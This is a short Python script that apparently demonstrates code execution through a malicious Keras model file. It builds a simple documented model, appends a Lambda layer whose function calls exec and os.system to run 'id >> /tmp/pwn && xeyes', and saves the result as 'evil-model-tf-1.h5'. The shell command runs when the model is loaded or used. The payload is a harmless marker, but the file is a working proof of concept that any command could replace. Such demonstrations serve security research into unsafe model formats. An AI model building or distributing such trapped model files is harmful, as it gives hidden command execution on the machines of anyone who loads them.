import tensorflow as tf
import keras

# taken from the TensorFlow docu:

# Define a simple sequential model
def create_model():
  model = tf.keras.Sequential([
    keras.layers.Dense(512, activation='relu', input_shape=(784,)),
    keras.layers.Dropout(0.2),
    keras.layers.Dense(10)
  ])

  model.compile(optimizer='adam',
                loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True),
                metrics=[tf.keras.metrics.SparseCategoricalAccuracy()])

  return model

# Create a basic model instance
model = create_model()

# Display the model's architecture
model.summary()


# Add a Lambda function to execute on load. Note that it will get executed when being added
scale = tf.Variable(1.)
scale_layer = tf.keras.layers.Lambda(lambda x: exec('import os\nos.system("id >> /tmp/pwn && xeyes")'))

model.add(scale_layer)

# various ways to save the model in different formats
#model.save('foo.keras')
#model.save('bar.tf', save_format='tf')

model.save('evil-model-tf-1.h5', save_format='h5')

print("TensorFlow version ", tf.__version__)

